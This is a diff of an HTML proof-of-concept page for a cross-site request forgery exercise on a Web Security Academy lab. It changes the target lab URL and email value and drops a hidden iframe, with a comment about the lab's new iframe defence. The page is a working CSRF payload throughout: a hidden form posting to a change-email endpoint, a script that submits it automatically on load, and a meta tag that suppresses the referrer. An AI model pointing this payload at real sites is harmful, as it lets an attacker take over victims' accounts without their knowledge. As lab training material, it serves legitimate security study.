@@ -3,11 +3,11 @@
         <meta name="referrer" content="never"> 
     </head>
 
+    <!--NOTE: Since the Web Security Academy intoduced a defense in that does not allow iframes from different origins, the iframe needs to be removed.-->
     <body>
         <h1>Hello world!</h1>
-        <iframe style="display:none" name="csrf-iframe"></iframe>
-        <form action="https://acd11fbc1fb050118088218e00de0010.web-security-academy.net/my-account/change-email" method = "post" id="csrf-form" target="csrf-iframe">
-            <input type="hidden" name="email" value="test5@test.ca">
+        <form action="https://0ab5007803da07dc80ad356300f6002f.web-security-academy.net/my-account/change-email" method = "post" id="csrf-form">
+            <input type="hidden" name="email" value="test6@test.ca">
         </form>
 
         <script>document.getElementById("csrf-form").submit()</script>
